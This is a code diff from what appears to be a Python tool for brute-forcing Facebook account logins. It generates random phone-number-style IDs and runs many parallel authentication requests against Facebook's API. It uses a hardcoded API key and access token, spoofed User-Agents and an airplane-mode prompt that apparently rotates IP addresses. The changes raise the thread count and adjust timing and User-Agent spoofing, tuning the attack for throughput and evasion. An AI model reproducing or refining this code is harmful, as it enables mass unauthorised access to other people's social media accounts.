@@ -569,7 +569,7 @@ def RANDOM():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(5))
     user.append(nmp)
-  with tred(max_workers=20) as king_xd:
+  with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
     ____banner____();print(f'{dot}IP ADDRESS{RED}   : {H}'+ip);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -763,7 +763,7 @@ def m1(ids,pwv):
             time.sleep(0.01)
         loop+=1
     except requests.exceptions.ConnectionError:
-        time.sleep(3)
+        time.sleep(10)
     except Exception as e:
         pass
 
@@ -1151,7 +1151,7 @@ def m7(ids,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            update={'User-Agent':sexy(),
+            update={'User-Agent':DEF3(),
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
